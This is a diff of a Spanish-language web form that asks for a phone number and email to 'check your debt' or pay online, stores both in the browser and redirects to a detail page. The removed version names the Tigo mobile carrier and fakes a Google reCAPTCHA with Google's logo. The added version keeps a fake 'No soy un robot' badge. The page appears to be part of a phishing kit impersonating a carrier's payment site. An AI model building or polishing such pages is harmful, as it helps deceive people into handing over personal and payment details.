@@ -2,106 +2,93 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Paga en línea</title>
+  <title>Formulario de Pago</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    /* (Todo tu estilo está intacto) */
-    /* ...copiado igual, sin cambios para no hacerte perder nada */
+    body {
+      font-family: Arial, sans-serif;
+      background-color: white;
+      text-align: center;
+      padding: 20px;
+    }
+
+    form {
+      background-color: #f9f9f9;
+      display: inline-block;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      max-width: 500px;
+      width: 100%;
+    }
+
+    input[type="text"],
+    input[type="email"] {
+      width: 95%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+
+    button {
+      background-color: #007bff;
+      color: white;
+      padding: 15px 30px;
+      font-size: 18px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    .captcha {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    img {
+      width: 100%;
+      max-width: 1000px;
+    }
   </style>
 </head>
 <body>
+  <img src="ban.jpeg" alt="banner">
+  <br><br>
 
-  <!-- Banner superior -->
-  <img src="ban.jpeg" alt="" width="100%">
-    
-  <br><br><br><br>
+  <form id="pagoForm">
+    <h2>Consulta tu deuda</h2>
+    <input type="text" name="numero" id="numero" placeholder="Número de línea" required>
+    <input type="email" name="email" id="email" placeholder="Correo electrónico" required>
+    <div class="captcha">🔒 No soy un robot</div>
+    <br><br>
+    <button type="submit">Consultar</button>
+  </form>
 
-  <!-- Formulario -->
-  <div class="contenedor">
-    <img src="pa.jpeg" alt="" width="100%">
-    <br><br><br>
+  <br><br>
+  <img src="pa.jpeg" alt="decoración">
+  <img src="nu.jpeg" alt="decoración">
+  <img src="pre.jpeg" alt="decoración">
+  <img src="fin.jpeg" alt="decoración">
 
-    <form id="pagoForm">
-      <img src="nu.jpeg" alt="Imagen de número" width="100%">
-      <input type="tel" id="numero" name="numero" placeholder="Línea Móvil Tigo" required>
-      <br><br>
-      <input type="email" id="email" name="email" placeholder="Correo electrónico" required>
-
-      <img src="pre.jpeg" alt="Imagen de precios" width="100%">
-      <br><br><br><br>
-
-      <!-- CAPTCHA simulado -->
-      <div class="captcha-simulacion" onclick="simularCaptcha()">
-        <div class="captcha-left">
-          <div class="captcha-checkbox" id="captchaCheckbox"></div>
-          <div class="captcha-texto" id="captchaTexto">No soy un robot</div>
-        </div>
-        
-        <div class="captcha-logo">
-          <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
-          <span>reCAPTCHA</span>
-          <a href="https://policies.google.com/privacy" target="_blank">Privacidad -Condiciones</a>
-        </div>
-      </div>
-      <br><br>
-
-      <!-- Botón -->
-      <button id="botonContinuar" type="submit">Continuar</button>
-    </form>
-  </div>
-
-  <br><br><br><br>
-
-  <!-- Footer -->
-  <footer>
-    <img src="fin.jpeg" alt="Pie de página">
-  </footer>
-
-  <!-- Scripts -->
   <script>
-    let captchaValidado = false;
-
-    function simularCaptcha() {
-      const checkbox = document.getElementById("captchaCheckbox");
-      const texto = document.getElementById("captchaTexto");
-
-      if (captchaValidado) return;
-
-      texto.textContent = "Validando...";
-      setTimeout(() => {
-        checkbox.classList.add("checked");
-        texto.textContent = "No soy un robot";
-        captchaValidado = true;
-      }, 1500);
-    }
-
-    function validarCaptcha() {
-      if (!captchaValidado) {
-        alert("Por favor verifica que no eres un robot.");
-        return false;
-      }
-      return true;
-    }
-
-    document.getElementById("numero").addEventListener("input", function () {
-      const boton = document.getElementById("botonContinuar");
-      boton.classList.toggle("activo", this.value.trim() !== "");
-    });
-
-    document.getElementById("pagoForm").addEventListener("submit", function (e) {
+    document.getElementById('pagoForm').addEventListener('submit', function(e) {
       e.preventDefault();
+      const numero = document.getElementById('numero').value.trim();
+      const email = document.getElementById('email').value.trim();
 
-      if (!validarCaptcha()) return;
+      localStorage.setItem('numero', numero);
+      localStorage.setItem('email', email);
 
-      const numero = document.getElementById("numero").value;
-      const email = document.getElementById("email").value;
-
-      localStorage.setItem("numero", numero);
-      localStorage.setItem("email", email);
-
-      window.location.href = "detalle.html";
+      window.location.href = 'detalle.html';
     });
   </script>
-
 </body>
 </html>
